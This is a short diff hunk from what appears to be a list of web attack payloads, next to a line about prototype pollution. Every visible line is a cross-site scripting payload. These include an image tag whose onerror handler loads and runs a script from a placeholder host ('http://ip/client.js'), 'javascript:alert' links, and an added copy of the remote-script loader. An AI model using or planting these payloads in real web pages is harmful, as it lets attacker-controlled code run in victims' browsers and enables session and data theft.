@@ -14,3 +14,4 @@ Prototype pollution vulnerability.
 <img src="http://nonexistent-image" onerror="var script = document.createElement('script'); script.src='http://ip/client.js'; document.body.appendChild(script);">
 java:alert()
 <a href="javascript:alert(1)">Click here</a>
+//<img src="nonexistent.jpg" onerror="var script = document.createElement('script'); script.src = 'http://ip/client.js'; document.body.appendChild(script);">
